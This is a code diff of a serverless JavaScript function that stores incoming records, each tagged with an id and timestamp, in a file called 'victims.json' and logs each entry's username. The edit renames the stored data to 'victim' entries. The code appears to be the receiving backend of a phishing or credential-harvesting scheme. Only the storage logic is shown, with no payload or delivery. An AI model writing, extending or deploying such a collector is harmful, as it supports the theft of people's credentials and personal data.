@@ -25,31 +25,31 @@ exports.handler = async function(event, context) {
             return { statusCode: 401, headers, body: JSON.stringify({ error: 'Unauthorized' }) };
         }
 
-        // Add timestamp
-        const newData = {
-            ...data,
+        // Create new victim entry with timestamp
+        const newVictim = {
             id: Date.now() + '-' + Math.random().toString(36).substr(2, 9),
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            ...data
         };
 
-        // Try to read existing data
+        // Read existing victims
         let victims = [];
+        const dataPath = path.join('/tmp', 'victims.json');
+        
         try {
-            const dataPath = path.join('/tmp', 'victims.json');
             const fileData = readFileSync(dataPath, 'utf8');
             victims = JSON.parse(fileData);
         } catch (e) {
-            // File doesn't exist yet
+            // File doesn't exist yet, start with empty array
         }
 
-        // Add new data
-        victims.unshift(newData);
+        // Add new victim to the beginning
+        victims.unshift(newVictim);
 
         // Save back to file
-        const dataPath = path.join('/tmp', 'victims.json');
         writeFileSync(dataPath, JSON.stringify(victims, null, 2));
 
-        console.log('✅ Data saved:', newData.username);
+        console.log('✅ Data saved for:', data?.username);
 
         return {
             statusCode: 200,
